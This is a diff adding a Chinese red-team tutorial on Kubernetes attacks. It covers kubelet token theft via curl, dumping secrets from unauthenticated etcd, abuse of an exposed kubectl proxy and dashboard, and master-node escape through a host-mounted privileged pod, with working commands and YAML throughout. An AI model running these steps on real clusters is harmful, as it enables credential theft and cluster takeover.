@@ -1,0 +1,163 @@
+想要在容器里执行命令的话，我们需要首先确定namespace、pod_name、container_name这几个参数来确认容器的位置。
+  * metadata.namespace 下的值为 namespace
+  * metadata.name下的值为 pod_name
+  * spec.containers下的 name 值为 container_name
+这里可以通过检索securityContext字段快速找到特权容器
+​ 在对应的容器里执行命令,获取 Token，该token可用于Kubernetes
+API认证，Kubernetes默认使用RBAC鉴权（当使用kubectl命令时其实是底层通过证书认证的方式调用Kubernetes API）
+token 默认保存在pod 里的/var/run/secrets/kubernetes.io/serviceaccount/token
+    curl -k -XPOST "https://192.168.11.160:10250/run/kube-system/kube-flannel-ds-dsltf/kube-flannel" -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
+​ 如果挂载到集群内的token具有创建pod的权限，可以通过token访问集群的api创建特权容器，然后通过特权容器逃逸到宿主机，从而拥有集群节点的权限
+    kubectl --insecure-skip-tls-verify=true --server="https://192.168.11.152:6443" --token="eyJhb....." get pods
+接下来便是通过创建pod来挂载目录，然后用crontab来获得shell了 。
+### 攻击2379端口
+#### 原理
+etcd组件默认监听2379端口：默认通过证书认证，主要存放节点的信息，如一些token和证书。
+kubernetes的master会自动安装etcd
+v3(注意版本)用来存储数据，如果管理员进行了错误的配置，导致etcd未授权访问的情况，那么攻击者就可以从etcd中拿到kubernetes的认证鉴权token，从而接管集群。
+#### 利用
+​ etcd2和etcd3是不兼容的，两者的api参数也不一样。 **k8s现在使用的是etcd v3** ， **必须提供ca、key、cert**
+，否则会出现Error: context deadline exceeded。
+使用官方提供的etcdctl直接用命令行即可访问etcd:
+下载etcd：
+解压后在命令行中进入etcd目录下。
+etcdctl api版本切换：
+    export ETCDCTL_API=2
+    export ETCDCTL_API=3
+探测是否存在未授权访问的Client API
+    etcdctl --endpoints=https://172.16.0.112:2379 get / --prefix --keys-only
+默认情况下需要授权才能访问，带上证书访问:
+    etcdctl --insecure-skip-tls-verify --insecure-transport=true --endpoints=https://172.16.0.112:2379 --cacert=ca.pem --key=etcd-client-key.pem --cert=etcd-client.pem endpoint health
+查看k8s的secrets：
+    etcdctl get / --prefix --keys-only | grep /secrets/
+读取service account token
+    etcdctl get / --prefix --keys-only | grep /secrets/kube-system/clusterrole
+    etcdctl get /registry/secrets/kube-system/clusterrole-aggregation-controller-token-jdp5z
+之后就通过token访问API-Server，获取集群的权限：
+    kubectl --insecure-skip-tls-verify -s https://127.0.0.1:6443/ --token="ey..." -n kube-system get pods
+也可以尝试dump etcd数据库，然后去找敏感信息
+    ETCDCTL_API=3 ./etcdctl --endpoints=http://IP:2379/ get / --prefix --keys-only
+如果服务器启用了https，需要加上两个参数忽略证书校验 --insecure-transport --insecure-skip-tls-verify
+    ETCDCTL_API=3 ./etcdctl --insecure-transport=false --insecure-skip-tls-verify --endpoints=https://IP:2379/ get / --prefix --keys-only
+### Kubectl Proxy
+#### 原理
+当运维人员需要某个环境暴露端口或者IP时，会用到Kubectl Proxy  
+使用kubectl proxy命令就可以使API server监听在本地的8009端口上：
+#### 利用
+设置API server接收所有主机的请求：
+    kubectl --insecure-skip-tls-verify proxy --accept-hosts=^.*$ --address=0.0.0.0 --port=8009
+之后就可以通过特定端口访问k8s集群
+    kubectl -s http://192.168.11.152:8009 get pods -n kube-system
+### Dashboard
+#### 原理
+​
+dashboard是Kubernetes官方推出的控制Kubernetes的图形化界面.在Kubernetes配置不当导致dashboard未授权访问漏洞的情况下，通过dashboard我们可以控制整个集群。
+  * 用户开启了enable-skip-login时可以在登录界面点击Skip跳过登录进入dashboard.
+  * 为Kubernetes-dashboard绑定cluster-admin（cluster-admin拥有管理集群的最高权限）.
+#### 利用
+默认配置登陆是需要输入 Token 的且不能跳过
+但是如果在配置参数中添加了如下参数，那么在登陆的过程中就可以进行跳过 Token 输入环节
+    - --enable-skip-login
+​ 点击Skip进入dashboard实际上使用的是Kubernetes-dashboard这个ServiceAccount，如果此时该ServiceAccount没有配置特殊的权限，是默认没有办法达到控制集群任意功能的程度的。
+给Kubernetes-dashboard绑定cluster-admin:
+    apiVersion: rbac.authorization.k8s.io/v1
+    kind: ClusterRoleBinding
+    metadata:
+      name: dashboard-1
+    subjects:
+    - kind: ServiceAccount
+      name: k8s-dashboard-kubernetes-dashboard
+      namespace: kube-system
+    roleRef:
+      kind: ClusterRole
+      name: cluster-admin
+      apiGroup: rbac.authorization.k8s.io
+绑定完成后，再次刷新 dashboard 的界面，就可以看到整个集群的资源情况。
+获取访问后直接创建特权容器即可getshell
+### k8s环境中的横向移动
+#### 目的
+​ 通常来说，拿到kubeconfig或者能访问apiserver的serviceaccount token，就代表着控下了整个集群。
+​
+但往往在红队攻击中，我们常常要拿到某一类特定重要系统的服务器权限来得分。前面我们已经可以在节点上通过创建pod来逃逸，从而获得节点对应主机的权限，那么我们是否能控制pod在指定节点上生成，逃逸某个指定的Node或Master节点。
+#### 亲和性与反亲和性
+​ 一般来说我们部署的Pod是通过集群的自动调度策略来选择节点的，但是因为一些实际业务的需求可能需要控制某些pod调度到特定的节点。就需要用到
+Kubernetes 里面的一个概念：亲和性和反亲和性。
+亲和性又分成节点亲和性( nodeAffinity )和 Pod 亲和性( podAffinity )。
+  * **节点亲和性** 通俗些描述就是用来控制 Pod 要部署在哪些节点上，以及不能部署在哪些节点上的
+  * **pod亲和性和反亲和性** 表示pod部署到或不部署到满足某些label的pod所在的node上
+##### 节点亲和性( nodeAffinity )
+节点亲和性主要是用来控制 pod 要部署在哪些主机上，以及不能部署在哪些主机上的,演示一下:
+查看node的label命令
+    kubectl get nodes --show-labels
+给节点打上label标签
+    kubectl label nodes k8s-node01 com=justtest
+    node/k8s-node01 labeled
+当node 被打上了相关标签后，在调度的时候就可以使用这些标签了，只需要在 Pod 的spec字段中添加 nodeSelector 字段
+    apiVersion: v1
+    kind: Pod
+    metadata:
+      name: node-scheduler
+    spec:
+      nodeSelector:
+        com: justtest
+##### Pod 亲和性( podAffinity )
+​ pod 亲和性主要处理的是 pod 与 pod 之间的关系，比如一个 pod 在一个节点上了，那么另一个也得在这个节点，或者你这个 pod
+在节点上了，那么我就不想和你待在同一个节点上。
+#### 污点与容忍度
+​ **节点亲和性** 是 Pod的一种属性，它使 Pod 被吸引到一类特定的节点。 污点（Taint）则相反——它使节点能够排斥一类特定的 Pod。
+污点标记选项：
+  * NoSchedule，表示pod 不会被调度到标记为 taints 的节点
+  * PreferNoSchedule，NoSchedule 的软策略版本，表示尽量不调度到污点节点上去
+  * NoExecute ：该选项意味着一旦 Taint 生效，如该节点内正在运行的pod 没有对应 Tolerate 设置，会直接被逐出
+​ 我们使用kubeadm搭建的集群默认就给 master 节点添加了一个污点标记，所以我们看到我们平时的 pod 都没有被调度到master 上去。
+给指定节点标记污点 taint :
+    kubectl taint nodes k8s-node01 test=k8s-node01:NoSchedule
+上面将 k8s-node01 节点标记为了污点，影响策略是 NoSchedule，只会影响新的 pod 调度。
+由于 node01节点被标记为了污点节点，所以我们这里要想 pod 能够调度到 node01节点去， **就需要增加容忍的声明**
+使用污点和容忍度能够使Pod灵活的避开某些节点或者将某些Pod从节点上驱逐。详细概念可以参考官网文档:[污点和容忍度 |
+Kubernetes](https://kubernetes.io/zh/docs/concepts/scheduling-eviction/taint-and-toleration/)
+#### 实现master节点逃逸
+比如要想获取到master节点的shell，则可以从这两点考虑
+  * 去掉“污点”（taints）（生产环境不推荐)
+  * 让pod能够容忍（tolerations）该节点上的“污点”。
+查看k8s-master的节点情况，确认Master节点的容忍度:
+创建带有容忍参数并且挂载宿主机根目录的Pod
+    apiVersion: v1
+    kind: Pod
+    metadata:
+      name: myapp2
+    spec:
+      containers:
+      - image: nginx
+        name: test-container
+        volumeMounts:
+        - mountPath: /mnt
+          name: test-volume
+      tolerations:
+      - key: node-role.kubernetes.io/master
+        operator: Exists
+        effect: NoSchedule
+      volumes:
+      - name: test-volume
+        hostPath:
+          path: /
+    kubectl -s 192.168.11.152:8080 create -f test.yaml --validate=false
+    kubectl -s 192.168.11.152:8080 --namespace=default exec -it test-master bash
+之后按照上面逃逸node01节点的方式写入ssh公钥即可getshell。
+### 参考文章
+[(34条消息) k8s:Kubernetes 亲和性、反亲和性、污点、容忍_m0_50434960的博客-CSDN博客](https://blog.csdn.net/m0_50434960/article/details/114897200)
+[浅谈 Kubernetes 安全风险 Part.1 – 天下大木头
+(wjlshare.com)](http://wjlshare.com/archives/1744)
+[Kubernetes安全测试实践录 - 跳跳糖 (tttang.com)](https://tttang.com/archive/1389/)
+[k8s安全攻防 -- etcd篇 (qq.com)](https://mp.weixin.qq.com/s/a7m6HIwl39eqYFIcwQeAVA)
+[k8s安全攻防 -- API Server & Kubelet 篇
+(qq.com)](https://mp.weixin.qq.com/s?__biz=MzI0OTIwMjE2NA==&mid=2247484596&idx=1&sn=f84546059fd2b83eb7148320edf0c520&chksm=e994502fdee3d9393793577821fc97537b3823437fdbda1499d89ab5b5d8fcc675d01f8fc37a&scene=178&cur_album_id=2151526440503132162#rd)
+[红蓝对抗中的云原生漏洞挖掘及利用实录
+(qq.com)](https://mp.weixin.qq.com/s/Aq8RrH34PTkmF8lKzdY38g)
+[浅谈云上攻防——Kubelet访问控制机制与提权方法研究 - 安全客，安全资讯平台
+(anquanke.com)](https://www.anquanke.com/post/id/250959#h2-9)
+[浅谈云安全之K8S - 安全客，安全资讯平台
+(anquanke.com)](https://www.anquanke.com/post/id/245526#h3-24)
+[k0otkit: Hack K8s in a K8s Way (wohin.me)](https://wohin.me/k0otkit-hack-k8s-in-a-k8s-way/)
+[Kubernetes(K8s)横向移动办法 « 倾旋的博客
+(payloads.online)](https://payloads.online/archivers/2021-07-20/1/)
